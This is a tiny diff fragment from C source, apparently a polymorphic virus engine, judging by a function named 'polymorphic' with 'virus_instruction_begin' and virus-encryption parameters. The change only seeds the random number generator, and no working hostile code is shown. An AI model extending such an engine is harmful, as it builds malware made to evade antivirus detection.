@@ -20,7 +20,8 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 
 
 
-
+	// seed the random number generator
+	srand(time(NULL));
 
 	unsigned long full_addr_enc_begin = virus_instruction_begin;
 
